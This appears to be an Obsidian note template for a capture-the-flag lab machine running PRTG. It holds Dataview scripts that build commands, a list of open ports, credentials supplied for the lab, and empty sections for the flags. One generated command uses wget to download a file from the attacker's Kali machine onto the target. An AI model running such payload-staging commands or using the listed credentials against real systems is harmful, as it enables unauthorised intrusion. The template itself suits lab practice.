[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```

```

wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---

| Username                    | Password      | Notes |
| --------------------------- | ------------- | ----- |
| prtgadmin              <br> | PrTg@dmin2018 |       |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
| 21   | ftp     |       |
| 80   | http    |       |
| 135  | ms RPC  |       |
| 139  | SMB     |       |
| 445  | SMB     |       |
| 5985 | win-RM  |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```